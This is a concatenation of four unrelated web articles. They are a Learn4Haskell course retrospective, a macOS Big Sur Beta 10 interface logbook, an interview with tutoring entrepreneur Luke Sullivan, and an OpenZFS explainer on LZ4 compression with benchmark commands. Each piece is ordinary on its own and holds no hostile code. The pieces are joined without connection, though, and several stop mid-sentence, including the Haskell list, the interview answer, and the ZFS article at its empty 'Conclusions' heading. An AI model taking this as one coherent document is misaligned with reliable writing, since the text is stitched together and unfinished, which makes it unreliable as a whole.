<blockquote>
<p>Learning Haskell should be easy and straightforward.</p>
</blockquote>
<p>Keeping all that in mind, we created the Learn4Haskell project in pursuit of the following goals:</p>
<ul>
<li>Help to get into the Haskell language.</li>
<li>Help to think in the Functional Programming way.</li>
<li>Challenge people to get out of their comfort zone of imperative programming and tweak their minds to accept FP paradigms.</li>
<li>Give a beginner-friendly and self-consistent course with theory and practice in the same place.</li>
<li>Explain Haskell topics before each task, but strive to be concise and useful at the same time. It’s a tough balance!</li>
<li>Help people who are eager to participate in Hacktoberfest and Open-Source, but also want to learn new things during this process.</li>
<li>Provide review and feedback to solutions, so people are never alone in this challenging yet exciting journey.</li>
<li>Give people who completed this course all the necessary understandings to be able to work with basic projects that use standard features. We also intend to give a strong basis that would be enough to continue their functional programming studies.</li>
<li>Show the wonderful world of FP to people outside and prove that everyone can learn those concepts in no time.</li>
<li>Engage people to the Haskell community and make them feel welcome.</li>
</ul>
<h2 id="preparations-and-execution">Preparations and Execution<a href="#preparations-and-execution">🔗</a></h2>
<p>Though the idea and goals look straightforward, it required a lot of time and effort from our side to get the project done. Besides the only apparent part that we were doing during the Hacktoberfest itself — reviewing —- we spent quite some time creating a competent project that would fulfil our goals. Our work on Learn4Haskell was, in fact, made in two giant, independent and essential steps:</p>
<ol type="1">
<li><em>Preparation</em>: What needed to be done <strong>Before</strong> the course.</li>
<li><em>Execution</em>: What we need to do everyday <strong>During</strong> the course (and <strong>after</strong> as well).</li>
</ol>
<h3 id="preparations">Preparations<a href="#preparations">🔗</a></h3>
<p>First of all, we started with the course plan, materials and logistic arrangements. We want people to be able to follow all the guides easily. Moreover, the course itself must be easy to set-up. And we also want it to bring something beneficial and valuable for people.</p>
<p>So, our preparations included the following actions:</p>
<ul>
<li><strong>Course agenda</strong>. This is the toughest and the most time-consuming part. We’ve spent a lot of time structuring our tutorials, rethinking the topics that need to be covered, brainstorming various ideas and evaluating the difficulty levels.</li>
<li><strong>Write the course content</strong>. After deciding on the alignment of topics, we needed actually to write down explanations of different Haskell concepts. As we provide all information in code comments, we want to make it easy to follow visually. After writing the guides, we came up with the tasks that reflect the course materials. We’ve spent around a week only purely writing the content of the course.</li>
<li><strong>Test the course</strong>. Next step involved a lot of reviewing rounds, putting ourselves into the shoes of FP beginners and battle-testing course concepts and tasks against different aspects. We also needed to estimate time that people could afford to spend on the course. We believe that people don’t have to spend too much time reading hundreds of Haskell guides in order to get started with the language, so the challenge was in keeping explanations concise but helpful simultaneously.</li>
<li><strong>Configure the automatic testing environment</strong>. Although we provide quick and detailed feedback regarding code, solutions, styling, ideas, performance and other aspects of the code structure and general advice about code in Haskell, we wanted to give people the ability to test their solution locally as well. Our course contains a lot of tasks of various difficulty, themes and concepts, and it makes sense to provide simple ways to check solutions for satisfying basic requirements. Since the course is aimed for beginners, who are not expected to know how to use Haskell build tools efficiently (which is tough to learn even for advanced Haskellers), we created two ways of testing solutions: GitHub Actions CI to test solutions when submitting PRs and Makefile with commands to test solutions locally. CI for forks can be enabled in one-click, so it is super easy to add automatic testing for your own repositories.</li>
<li><strong>Prepare solutions</strong>. As we want Learn4Haskell to be accessible to more people, we also understand that some would be shy to reach out to us, or ask for the review and ask questions. There could be lots of reasons for which people would prefer to work on the course standalone. And we definitely want learners to be able to verify their solutions even if they decide to go this learning journey on their own. So we’ve spent some time writing idiomatic solutions for all tasks that they can use in their learning.</li>
<li><strong>Write documentation and instructions</strong>. This is a tricky part as Haskell is known as a very-hard-to-get-started-with language. Our goal was to provide batteries-included instructions that are easy to follow, and that would work on all of the most popular platforms with minimal efforts. So we carefully describe get-started installation instructions, as well as the essential information about the course, how it works, what to expect and what participants should do on each step, and all other required metadata.</li>
<li><strong>Design work</strong>. As we wanted our project to be visible and Hacktoberfest compliant, we’ve spent some time making it look like candy. For that, we created a resonant name and branded around it. The Learn4Haskell naming was perfect for that as it demonstrates everything this project is about and greatly fits the 4-steps course and 4 PR workflow of the event. Fortunately, Hacktoberfest helped to come up with the design, and the pull request sign perfectly represents number 4 in our logo. Hacktoberfest provides some templates, but it is still not an instant process …</li></ul></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>When I started this logbook back in August, as I was exploring Big Sur Beta 5 and finding parts of the user interface redesign that didn’t convince me, I started making up in my mind a possible way for things to develop from then on. I thought: <em>These are just quick <span>&amp;</span> dirty UI ideas and implementations; I expect things to visibly change from beta to beta, especially as the time to finally release Big Sur approaches, perhaps sometime in October</em>.</p>
<p>But things have progressed differently. So far, two aspects of Big Sur have made an impression on me:</p>
<ol>
<li>Its stability. Granted, I haven’t proverbially “thrown anything at it” so far, but for the past three months I’ve been using my 13-inch MacBook Pro with Big Sur pretty much normally. Which means doing all the tasks I typically do on my main Macs on a daily basis. Sure, there has been the occasional unexpected quitting from this or that app, but not really more frequently than what might happen with a regular Mac running a regular Mac OS release. I already said this more than once in this logbook, but in all this time using Big Sur on the MacBook Pro, I’ve never felt I was using beta software.</li>
<li>How <em>little</em> the user interface has changed since Apple previewed Big Sur back in June. As I was saying before, I expected the first betas to be a rough design sketch, bound to be drastically <em>improved upon</em> (not simply refined) from beta release to beta release. Instead, all visual changes at the UI level so far have been surprisingly restrained. You may think, <em>Well, that’s a good sign. It means that Apple really believes in this redesign</em>. In a sense, it’s true. Apple believes to be doing good work with Big Sur’s user interface. They have a plan and they’re demonstrating they’re willing to stick with it. That doesn’t mean it’s a great plan, though.</li>
</ol>
<p>No matter how hard Apple tries to spin it, when I’m using Big Sur, I’m not feeling that the reasoning behind all these UI changes was <em>Let’s take the great Mac OS user interface we’ve been perfecting for years and make it better</em>. What I feel, instead, is that behind this user interface redesign there was one simple major directive that came from above: <em>Make it look more like iOS</em>.</p>
<p>I’m just speculating here, of course, but if whenever you encounter a visual change in Big Sur that doesn’t strike you as particularly logic — or doesn’t strike you as particularly improving on what was there before (or how things worked before) — you ask yourself <em>Why did they do this?</em>, try answering the question with <em>Because it had to look more like iOS</em>. You’ll be surprised by how frequently this works.</p>
<p>We’re approaching the end of October, and Big Sur is still in beta, and there are still a lot of visual details that have remained alarmingly unchanged or have been altered so very little; and unless there’s a big change coming in one of the next betas, I have to assume that Apple is fine with such details. And I mean, terrible icons, terrible visual contrast still present in several places, terrible redesign of all dialog boxes, operations that used to need just one click have now become more awkward (requiring more clicks), changes that are simply æsthetic in nature instead of functional (the merging of title and toolbar in Finder windows and application windows, for example), and so forth.</p>
<p>I have to assume that Apple is fine with such details. Which is a bit alarming, but not entirely unexpected. It’s the same company that insisted for years that the butterfly mechanism was better than the scissor mechanism for their laptop keyboards.</p>
<p>Anyway, let’s have a look at some of the UI refinements I’ve spotted in Beta 10. They’re all rather subtle, but entirely welcomed.</p>
<h3>Menu bar spacing</h3>
<p>One of the first visual changes I complained about as soon as I installed Beta 5 back in August was the excessive space between menu names and menu items on the main menu bar. I’m happy to report that finally in Beta 10 the space between menu bar items has been reduced. Not by much, just a few pixels, but the cumulative effect is noticeable and appreciated:</p>
<p><img loading="lazy" title="Menu-items-B5vsB10.png" src="https://i0.wp.com/morrick.me/wp-content/uploads/2020/10/Menu-items-B5vsB10.png?resize=815%2C80" alt="Menu items B5 vs B10" width="815" height="80" data-recalc-dims="1"><br>
<em>Menu extras in Beta 5 (above) and Beta 10 (below).</em></p>
<p>The Dropbox icon is in a different place, as sometimes happens after a restart, but these are the same 15 menu items. As you can see, the space we’ve gained is noticeable. Another pleasant detail you can observe is how the transparency of the menu bar has been decreased over the course of five betas.</p>
<p>Note, however, that only the space between menu extras has been reduced, not between menu names:</p>
<p><img loading="lazy" title="Menubar-B5vsB10.png" src="https://i0.wp.com/morrick.me/wp-content/uploads/2020/10/Menubar-B5vsB10.png?resize=960%2C60" alt="Menubar B5 vs B10" width="960" height="60" data-recalc-dims="1"><br>
<em>Menu names in Beta 5 (above) and Beta 10 (below).</em></p>
<h3>Finder windows</h3>
<p>Essentially unchanged except for the icon size slider. Now it has lost all colour and has gone from being too noticeable to being almost too subtle:</p>
<p><img loading="lazy" title="B8-fw-slider.png" src="https://i2.wp.com/morrick.me/wp-content/uploads/2020/10/B8-fw-slider.png?resize=350%2C250" alt="Icon size slider (B8)" width="350" height="250" data-recalc-dims="1"></p>
<p><img loading="lazy" title="B10-fw-slider.png" src="https://i2.wp.com/morrick.me/wp-content/uploads/2020/10/B10-fw-slider.png?resize=350%2C250" alt="Icon size slider (B10)" width="350" height="250" data-recalc-dims="1"></p>
<p>I don’t understand why not make the design of this slider consistent with, say, the sliders in this part of the Dock <span>&amp;</span> Menu Bar preference pane:</p>
<p><img loading="lazy" title="Dock-Menubar-sliders.png" src="https://i0.wp.com/morrick.me/wp-content/uploads/2020/10/Dock-Menubar-sliders.png?resize=447%2C173" alt="Sliders in Dock and Menubar pref pane" width="447" height="173" data-recalc-dims="1"></p>
<h3>Transparency</h3>
<p>The Dock’s transparency has been slightly, progressively reduced from beta to beta:</p>
<p><img loading="lazy" title="B5-Dock.png" src="https://i0.wp.com/morrick.me/wp-content/uploads/2020/10/B5-Dock.png?resize=755%2C54" alt="The Dock in Beta 5" width="755" height="54" data-recalc-dims="1"></p>
<p><img loading="lazy" title="B10-Dock.png" src="https://i1.wp.com/morrick.me/wp-content/uploads/2020/10/B10-Dock.png?resize=918%2C53" alt="The Dock in Beta 10" width="918" height="53" data-recalc-dims="1"><br>
<em>Emphasis on ‘slightly’.</em></p>
<p>The transparency of menu listings has also been reduced over time: Beta 10 here is slightly less transparent than even Beta 8. And the selected menu name in the menu bar is more prominent (the background behind the text is darker). Here’s a progression from Beta 5 to Beta 10:</p>
<p><img loading="lazy" title="B5-menu-sel-look-default.png" src="https://i0.wp.com/morrick.me/wp-content/uploads/2020/10/B5-menu-sel-look-default.png?resize=417%2C251" alt="Menu transparency in B5" width="417" height="251" data-recalc-dims="1"></p>
<p><img loading="lazy" title="B8-menu-sel-look-default.png" src="https://i2.wp.com/morrick.me/wp-content/uploads/2020/10/B8-menu-sel-look-default.png?resize=417%2C251" alt="Menu transparency in B8" width="417" height="251" data-recalc-dims="1"></p>
<p><img loading="lazy" title="B10-menu-sel-look-default.png" src="https://i1.wp.com/morrick.me/wp-content/uploads/2020/10/B10-menu-sel-look-default.png?resize=417%2C251" alt="Menu transparency in B10" width="417" height="251" data-recalc-dims="1"></p>
<h3>Miscellaneous fixes/changes</h3>
<p>• The Preferences window in Mail has been fixed. Now <em>Rules</em> isn’t left out:</p>
<p><img loading="lazy" title="preferences-forgotten-menu.png" src="https://i2.wp.com/morrick.me/wp-content/uploads/2020/10/preferences-forgotten-menu.png?resize=668%2C570" alt="Preferences forgotten menu" width="668" height="570" data-recalc-dims="1"><br>
<em>Up to Beta 9 included.</em></p>
<p><img loading="lazy" title="B10-fixed-preferences.png" src="https://i1.wp.com/morrick.me/wp-content/uploads/2020/10/B10-fixed-preferences.png?resize=671%2C642" alt="Fixed Preferences window in B10" width="671" height="642" data-recalc-dims="1"><em>In Beta 10.</em></p>

<p>• In <em>System Preferences</em> → <em>Desktop <span>&amp;</span> Screen Saver</em>, there is an updated graphic to show Dynamic Desktops. I like it.</p>
<p><img loading="lazy" title="02-desktop-ss-BS1.png" src="https://i1.wp.com/morrick.me/wp-content/uploads/2020/10/02-desktop-ss-BS1.png?resize=780%2C688" alt="Desktop and Screen Saver (B5)" width="780" height="688" data-recalc-dims="1"><em>Dynamic Desktop option in Beta 5.</em></p>
<p><img loading="lazy" title="B10-dynamic-desktop.png" src="https://i0.wp.com/morrick.me/wp-content/uploads/2020/10/B10-dynamic-desktop.png?resize=780%2C688" alt="Desktop and Screen Saver (B10)" width="780" height="688" data-recalc-dims="1"><em>Dynamic Desktop option in Beta 10.</em></p>

<p>• In <em>Safari</em> → <em>Preferences</em> → <em>Privacy</em>, the option for “allowing websites to check if Apple Pay is set up” is back:</p>
<p><img loading="lazy" title="preferences-privacy-HS.png" src="https://i1.wp.com/morrick.me/wp-content/uploads/2020/10/preferences-privacy-HS.png?resize=881%2C373" alt="Preferences - Privacy (High Sierra)" width="881" height="373" data-recalc-dims="1"><em>This is how it was in Mac OS 10.13 High Sierra.</em></p>
<p><img loading="lazy" title="preferences-privacy.png" src="https://i2.wp.com/morrick.me/wp-content/uploads/2020/10/preferences-privacy.png?resize=904%2C310" alt="Preferences - Privacy up to B9" width="904" height="310" data-recalc-dims="1"><em>It would disappear later and in the Big Sur betas so far.</em></p>
<p><img loading="lazy" title="B10-preferences-privacy.png" src="https://i0.wp.com/morrick.me/wp-content/uploads/2020/10/B10-preferences-privacy.png?resize=904%2C394" alt="Preferences - Privacy - Now" width="904" height="394" data-recalc-dims="1"><em>Now it’s back in Beta 10, with an updated wording that includes Apple Card.</em></p>

<p>• I don’t know if these have appeared in the most recent Big Sur beta or if they were introduced before, but I’ve noticed that there are new background images you can choose from when customising Safari’s Start Page.</p>
<p><img loading="lazy" title="B10-customise-startpage-newimages.png" src="https://i1.wp.com/morrick.me/wp-content/uploads/2020/10/B10-customise-startpage-newimages.png?resize=275%2C320" alt="New images in Customise Start Page" width="275" height="320" data-recalc-dims="1"></p>

<hr>

<p>These are the most significant changes I’ve noticed, UI-wise, in Big Sur Beta 10. There may be others buried in the system. I have good visual memory, but I’m not exactly keeping track of every interface detail across several built-in apps. But I’m sure I would have noticed if something had been changed in some major way.</p>
<p>At this point I’m guessing Big Sur will be publicly released sometime in November, and all the visual changes I’ve seen so far have been minimal. Refinements, little touches, nothing more. Some of these little touches were long overdue, and I’m glad transparency is being reduced in a few key places. I feel there’s still much more to fix, but I guess that it’s ‘good enough’ for Apple, and hopefully some of the things mentioned above, which I still think need fixing, will be addressed in future minor releases.</p>
<p>However, apart from certain gripes, if I had to judge the overall experience — not just the interface, but system stability and responsiveness — I’d say that Big Sur at this beta stage feels much better than Catalina in its released state.</p>

			<p><strong>Luke Sullivan – literature major turned entrepreneur and educationalist. Luke studied English at university and was on track for a career in law, before a chance tutoring assignment changed his life’s trajectory. Fast-forward thirteen years and Luke is the founder of the <a href="https://www.modelex.mc/">Modelex Education Centre </a>in Monaco and<a href="https://www.riviera-tutors.com/"> Riviera Tutors</a> in the UK, two of Europe’s most reputed educational organizations. He remains a staunch advocate for the benefits of a humanities education to this day.</strong></p>
<p><b>Human Jobs (HJ): </b>Luke, thanks so much for chatting with Human Jobs! Let’s start with five rapid fire questions to get the ball rolling. What is your job?</p>
<p><b>Luke Sullivan (LS): </b>Founder/Director of <a href="https://www.modelex.mc/">Modelex Education Centre</a> in Monaco and <a href="https://www.riviera-tutors.com/">Riviera Tutors</a> in London.</p>
<p><b>HJ: </b>How did you find the job?</p>
<p><b>LS:</b> I made it. After tutoring in the late 2000s, I set up Riviera Tutors in 2009 and from there founded the Modelex Education Centre in Monaco.</p>
<p><b>HJ:</b> Where are you from and where do you live now?</p>
<p><b>LS: </b>I’ve lived in London, Sheffield, and Bristol in the UK, and Monaco for the last decade.</p>
<p><b>HJ:</b> What was your undergraduate major? Happy with your choice?</p>
<p><b>LS: </b>English Literature. Yes.</p>
<p><b>HJ: </b>What is the best part of a normal workday?</p>
<p><b>LS: </b>Problem solving – helping parents and students come to grips with educational challenges, and working to develop an effective solution.</p>
<p><b>HJ:</b> Favorite book?</p>
<p><strong>LS:</strong><i>&nbsp;Blood Meridian</i> by Cormac McCarthy</p>
<p><b>Human Jobs (HJ): </b>You admirably endured some rapid fire, so let’s dig a little deeper now. Tell me about your education and your plans as a young graduate.</p>
<p><b>LS: </b>Although my family is originally from the South of England, I actually spent my formative school years in the North. Looking back, I realize that I experienced an underlying sense of displacement when I was young because of the UK’s North-South divide and the country’s simmering class-obsession. It was difficult to define myself on my own terms. I am reminded of Philip Larkin’s poem, “The Importance of Elsewhere,” which now strikes me as an apt description of my time in the UK.</p>
<p>I think that sense of incongruity is what drew me to Monaco – it’s a place where most people are foreigners and everyone has to stand on their own two feet. In Larkin’s words, ‘‘elsewhere” reassuringly “underwrites” their existence.</p>
<p><b>HJ:</b> I know you considered a career in the law. Why did you choose against a legal career and how did your interest in education and tutoring start?</p>
<p><b>LS: </b>The novels of John Grisham played a big role in my early career ambitions, and I was drawn to what seemed like an exciting profession. I presumed I’d get a training contract at a decent London firm and climb some sort of ladder. It appeared a straightforward and potentially rewarding path.</p>
<p>But my life took a major turn when I began tutoring in Monaco after university, where I started to build a small “network” in the tutoring and education community. In 2009, I was given the chance to home-school a student in Monaco and thought, “before I go down the legal path, I may as well spend a year in Monaco – something good and perhaps unusual is likely to happen.”</p>
<p>I spent the year in Monaco, met all sorts of people, and had enough work that I began referring families to tutors who shared my values and pedagogical approach. That is how Riviera Tutors began, and I have been refining the process ever since.</p>
<blockquote><p>I ended up deferring law school for four years, before deciding that I was kidding myself by even reapplying. It was only then that I committed to the entrepreneurial path that I had stumbled upon.</p></blockquote>
<p>In short, all the careful career planning came to naught, and most of my major decisions were born out of circumstance – I seized the opportunities that arose. I have no regrets about not going down the legal path. Want to make the gods laugh? Show them your plans.</p>
<p><b>HJ:</b> Tell me about the transition from literature graduate to entrepreneur. What was that journey like? How did it start?</p>
<p><b>LS:</b> At university, I was excited by the ways literature can fold a range of topics&nbsp; – politics, philosophy, psychology, history, economics – all within a story. It seemed relevant, as well as enjoyable: a study of both society and the individual human condition.</p>
<p>As a student, however, I became disillusioned with the academic path. I saw the person my professors wanted me to become and knew I wanted something different. But I didn’t know what that might be or how I could achieve it.</p>
<p>The fact I knew so little and was so naïve after university gave me unwarranted confidence in my own abilities. It was only through charging into things and making mistakes that I became humbler.</p>
<blockquote><p>My initiation with the “real-world” was not always easy and is still ongoing, but it was ultimately an important and transformative experience. Interestingly, the process breathed life into the literature that I’d read as a student, but never fully appreciated. It was only through living a little that certain literary works started to resonate with my own personal experiences.</p></blockquote>
<p>To my mind, business strikes me as a gritty and practical affair, concerned with actions and real consequences. And yet it’s also about having a vision and executing it. It is an arena where you develop a “feel” for what intentions lie behind words. For someone who was taught the value of language, business has proven an ideal complement.</p>
<p><b>HJ: </b>What is it like to run your own business? To whom would you recommend the path?</p>
<p><b>LS: </b>Running your own business means realizing that everything depends on you – you are responsible for everything and everyone around you. It involves thinking ahead and predicting potential problems, and considering the implications of actions many steps in advance. It also entails real consequences for mistakes or missteps. You have to own your own mistakes and make amends for them in one way or another. There are no cushions and you don’t benefit from any schemes designed for productivity enhancement or job security.</p>
<blockquote><p>At the same time, there is continual excitement that comes from interacting with reality, in all its complexity and contradiction. There is also a sense of liberation – if you have an idea, you can realize it. This is a huge upside that, for me, far outweighs the risk.</p></blockquote>
<p>I would recommend the path to people who are up for a bracing challenge and who like to face the unexpected. If you like things to be neatly compartmentalized in life and enjoy executing well-defined tasks, then running your own business might not be for you. It is a particular style of life – no better or worse than others – but one that has special demands and significant upsides, as well.</p>
<p><b>HJ: </b>I know you recently set up the Modelex Education Centre in Monaco. Tell me about the highlights and lowlights of that experience?</p>
<p><b>LS: </b>Our goal was always to create a learning environment shaped by our particular approach and values, and it has been rewarding to see this vision take shape. Still, setting up the Modelex Education Centre in Monaco involved a number of logistical hurdles, such as accommodating stringent government requirements, finding suitable space in the Principality (a true challenge), and taking on a fair amount of risk.</p>
<p>It was the culmination of a decade of work and integration in the Monaco community. By far, the most gratifying thing has been building an outstanding faculty, and watching a genuine team spirit emerge. Having our students enter that environment and benefit from it, has been a real pleasure.</p>
<p>Setting up the center has demonstrated the interplay between practical tasks, values, and ideals that are characteristic of business. It’s necessary to keep them all in mind at the same time.</p>
<p><b>HJ: </b>Humanities graduates often talk about how their education has served them in unexpected ways. Can you give some specific examples of how your humanities background proved useful&nbsp; in the “real world”?</p>
<p><b>LS: </b>I never thought of myself as a salesman, let alone a good salesman. Indeed, I would have taken such a description as an insult. But literature is about narratives, and often when working with families, I would create a narrative around their child: what their strengths and weaknesses are, how we hope to help them, what our expectations and hopes for the future are.</p>
<p>It turns out that a credible narrative is something people are often willing to buy into, even if it isn’t always good news. So, I guess my humanities background gave me latent sales skills that I didn’t acknowledge until I was forced to put them to use.</p>
<blockquote><p>The analytical skills developed in the humanities are useful for reading situations, in the same way that one analyzes a literary text or crafts an essay. We tell and listen to stories all day long – it’s fundamental to who we are – so it’s not difficult to see the value of storytelling both in literature and real life.</p></blockquote>
<p>Despite that, I feel I should add that words only go so far. My school motto was ‘Res Non Verba’ – ‘Deeds Not Words’ – and this continues to resonate with me. Good words must be backed up by good actions. Good words followed by bad actions or inaction can destroy a reputation and easily get you marked out as a charlatan.</p>
<p>I see the two as complementary: words without actions are hollow, but actions without words lack definition. You’re onto something when the two work in harmony.</p>
<p>I also think a humanities education equips you well to see connections between people, which can facilitate relationship building despite ostensible differences. Monaco is a place characterized by cultural diversity, and people are often aware of the differences between themselves and others. I don’t think this ability is the preserve of humanities graduates, but a humanities education does train those skills. Reading, like travel, builds empathy and understanding.</p>
<p><b>HJ: </b>What were the main challenges that you faced when you entered the professional world?</p>
<p><b>LS: </b>Having no experience, reputation, network or financial backing in a foreign country were pretty big challenges. I started working as hard as I could and tried to …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>
<h3><em>This is part of our article series published as “OpenZFS in Depth”. <a href="https://klarasystems.com/articles/"><strong><span>Subscribe to our article series</span></strong> </a>to find out more about the secrets of OpenZFS</em></h3>



<hr>



<p>Transparent (inline) configurable compression is one of OpenZFS’ many compelling features—but it is also one of the more frequently misunderstood features. Although ZFS itself currently defaults to leaving compression off, we believe you should almost always use LZ4 compression on your datasets and zvols. There is such wide acceptance of this idea, that the default compression setting is likely to change in a future release of OpenZFS.</p>



<p>Compression is a per dataset/zvol property, not a pool level feature. This means that you can configure compression differently for groups of data in the same pool. For example, you might use “<em><strong>zfs set compression=lz4 tank</strong></em>” to set an inheritable default for the pool, but then “<em><strong>zfs set compression=gzip tank/textfiles</strong></em>” to get better compression ratios in a particular dataset which only contains highly compressible data.</p>



<p>ZFS has no problem dealing with a mix of uncompressed, LZ4 compressed, and gzip compressed records sitting side by side in the same dataset. ZFS does not need to immediately rewrite existing data if the setting changes.</p>



<p>After changing the “<em><strong>compression</strong></em>” value of a <strong>dataset</strong> or <strong>zvol</strong>, you may either let things continue as they are—in which case old data is stored under the old compression scheme, but new data is written using the new one—or you may recopy the existing data, then delete the original copies.</p>



<p><strong>So, operating ZFS compression is simple—but before we move on, we should talk a little bit about how it actually works. </strong></p>



<p>To do that, we’ll need to dive into some low-level basics about ZFS read and write operations. </p>



<h4><strong>Explaining <em>ashift</em> and <em>recordsize</em> / <em>volblocksize</em></strong></h4>



<p>The two most important configurables for ZFS storage parameters are <strong><em>“ashift”</em></strong> – a per-vdev option which should be set to correspond with the actual hardware blocksize of the underlying devices – and “<strong><em>recordsize</em></strong>” (or “<strong><em>volblocksize</em></strong>“, if we’re talking about ZVOLs).</p>



<p><strong><em>recordsize</em></strong> is a bit more difficult to explain than <strong><em>ashift</em></strong>. The smallest individually-operable block of data on a ZFS dataset is one record. This means that when you change a single byte of data within one record, ZFS makes a new copy of the entire record with your one byte change, and writes that newly modified record to disk.</p>



<p>With the newly modified record written to disk, ZFS unlinks the old record from the current version of the filesystem and replaces it with a link to the newly-written, modified record. ZVOLs work essentially the same way, only with volblocks—whose size is controlled by the <strong><em>“volblocksize</em></strong>” property—instead.</p>



<p>One final piece to the puzzle – ZFS can write undersized records if necessary. If you save a 1KiB text file in a dataset with “<strong><em>recordsize=1M</em></strong>” set, it does not consume the entire 1MiB maximum record size—your file is saved in an undersized, single-block record. With “<strong><em>ashift=12</em></strong>” – corresponding to a hardware block size of 2<sup>12</sup>, or 4K—that means your 1KiB file takes up 4KiB on disk, not 1MiB!</p>



<h4><strong>How OpenZFS Compression Works</strong></h4>



<p>Now that we understand the difference between “<strong><em>ashift</em></strong>” and “<strong><em>recordsize</em></strong>” (or “<strong><em>volblocksize</em></strong>“), we can more easily discuss how compression works. Let’s say you’ve got a dataset with OpenZFS’ current default of “<strong><em>recordsize=128K</em></strong>“, sitting atop a pool constructed of vdevs with “<strong><em>ashift=12</em></strong>“.</p>



<p>Our hardware blocksize is 4KiB, and our desired maximum record size is 128KiB – so a typical record, uncompressed, will be stored in thirty-two 4KiB blocks. What if we’ve got “<strong><em>compression=lz4</em></strong>” set, and the LZ4 algorithm can achieve a raw 1.32 compression ratio, compressing that 128KiB of data down to 97KiB?</p>



<p>You need twenty-five total 4KiB blocks to store 97KiB of data – so while we’re still looking at a single 128KiB record, that record now occupies twenty-five blocks on disk, not thirty-two—an on-disk “<strong><em>compressratio</em></strong>” of 1.28.</p>



<p>Assuming we’ve correctly set “<strong><em>ashift</em></strong>” to match our underlying hardware’s specifications, that means we can fetch that record about 22% more efficiently than we could have otherwise. That extra 22% we saved on this record means lower latency reading or writing it, and provides better overall throughput if it’s one of an entire stream of blocks we’re reading or writing at once.</p>



<h4><strong>Higher <em>recordsize</em> Means Better Compression Ratios</strong></h4>



<p>The larger your records or volblocks are, the better compression ratios you’ll get. The first reason is that the compression dictionary is per-record, so larger records can compress more efficiently.</p>



<p>The relationship between <em><strong>ashift</strong></em> and <strong><em>recordsize</em></strong> is even more important than the raw “<strong><em>recordsize</em></strong>” itself. Remember, we store each “<strong><em>record</em></strong>” in blocks determined by “<strong><em>ashift</em></strong>” – and if you can’t decrease the number of blocks required to store the record, you won’t get any compression on that record.</p>



<p>To demonstrate this, let’s examine a dataset with “<strong><em>recordsize=16K</em></strong>” sitting on a pool with vdevs set to “<strong><em>ashift=13</em></strong>“, or 8K hardware block size. If LZ4 gives us the same 1.32 raw compression ratio that we had in the last example on each record, we get no compression at all! Wait, what?</p>



<p>16KiB of data, compressed down to 78.1% of its original size, becomes 12.5KiB of data. Unfortunately, 12.5KiB of data still requires two 8KiB hardware blocks on-disk—which would result in an on-disk “<strong><em>compressratio</em></strong>” of 1.00x—meaning completely uncompressed. So, ZFS won’t actually store this record compressed at all, since there would be no savings.</p>



<p>It is still possible to achieve usable on-disk compression with “<strong><em>recordsize=16K</em></strong>” and “<strong><em>ashift=13</em></strong>“, of course—but only for individual records which can achieve raw compression ratios of 2.00 or better.</p>



<h4><strong>Compression ratios on small <em>recordsize</em> datasets</strong></h4>



<p>Consider a MySQL database, which we want to store on a pool with vdevs set “<strong><em>ashift=13</em></strong>“. Many commonly-used high-performance SSDs perform best with this high “<strong><em>ashift</em></strong>” value—and MySQL itself defaults to a tablespace page size of 16KiB.</p>



<p>This leaves us where we were in the previous section—hardware block size 8KiB, and recordsize of 16KiB. But in this scenario, we often see an on-disk “<strong><em>compressratio</em></strong>” higher than 1.00x, but (much) lower than 2.00x.</p>



<p>Although the MySQL database’s data may only be compressible to 1.32x when considered as a whole, individual 16KiB chunks of it may very well achieve 2.00x or better raw compression. Any individual record which compresses at 2.00x or better can be stored in a single 8KiB block.</p>



<p>So, if we have a 1GiB MySQL database in a dataset that reports 1.1x “<strong><em>compressratio</em></strong>“, that means that around 5,000 of the 65,536 ZFS records in the database compressed to 2.00 or better, and thus could be stored in single 8KiB hardware blocks.</p>



<p>On the other hand, what if we had <strong>“<em>recordsize=8K</em></strong>” and “<strong><em>ashift=13</em></strong>“? In this case, no on-disk compression is possible – because an uncompressed record already only requires a single block, and therefore can’t be stored in <em>fewer</em> blocks, no matter how high its “<strong><em>compressratio</em></strong>“.</p>



<h4><strong>ZFS Compression, Incompressible Data and Performance</strong></h4>



<p>You may be tempted to set “<strong><em>compression=off</em></strong>” on datasets which primarily have incompressible data on them, such as folders full of video or audio files. We generally recommend against this – for one thing, ZFS is smart enough not to keep trying to compress incompressible data, and to never store data compressed, if doing so wouldn’t save any on-disk blocks.</p>



<p>You might still not be convinced – so far, all we’re talking about is mitigating a performance decrease. Isn’t it better to avoid the decrease in the first place? Probably not. The performance “penalty” for working with incompressible data is minuscule, and the potential gains in working with compressible data are much larger.</p>



<pre><code>root@lab:/data/test# pv &lt; in.rnd &gt; lz4-compressed/out.rnd
7.81GB 0:00:22 [ 359MB/s] [==================================&gt;] 100%

root@lab:/data# zfs get compressratio data/test/lz4-compressed
NAME                 PROPERTY       VALUE  SOURCE
data/lz4-compressed  compressratio  1.00x  -
</code></pre>



<p>In the above example, we take previously-generated incompressible data stored on one high-performance SSD, and write it to another high-performance SSD, with “<strong><em>compression=lz4</em></strong>” and the default “<strong><em>recordsize=128K</em></strong>“. The source data is in the system cache, so the write speed is the only bottleneck here.</p>



<p>The data streams at 359MiB/s—but would it go any faster, if written to a dataset with “<strong><em>compression=off</em></strong>“?</p>



<pre><code>root@lab:/data# pv &lt; in.rnd &gt; uncompressed/out.rnd
7.81GB 0:00:21 [ 378MB/s] [==================================&gt;] 100% 
</code></pre>



<p>This time, we got 378MiB/sec. So while we did see a performance penalty—(378-359)/378=5.0%—it’s certainly not an enormous one. Now, what kind of benefits can we see in real-world scenarios, with a mix of compressible and incompressible data?</p>



<pre><code>root@lab:/data/test# pv &lt; win2012r2-gold.raw &gt; lz4/win2012r2-gold.raw
8.87GB 0:00:17 [ 515MB/s] [==================================&gt;] 100%

root@lab:/data# zfs get compressratio data/test/lz4-compressed
NAME                      PROPERTY       VALUE  SOURCE
data/test/lz4-compressed  compressratio  1.48x  -
</code></pre>



<p>In the above example, we’re saving a Windows Server 2012 R2 gold image to an LZ4 compressed dataset. The gold image is a fully-installed Windows Server 2012 R2 VM, with drivers and a few client-specific applications installed, which has then been `<strong><em>sysprep</em></strong>`ed for deployment to new virtual machines.</p>



<p>This is obviously not a “perfect” candidate for compression, like a directory full of text files. But it still achieved a 1.48x compression ratio—and a whopping (515-378)/378=36% performance improvement.</p>



<h4><strong>Conclusions</strong></h4>



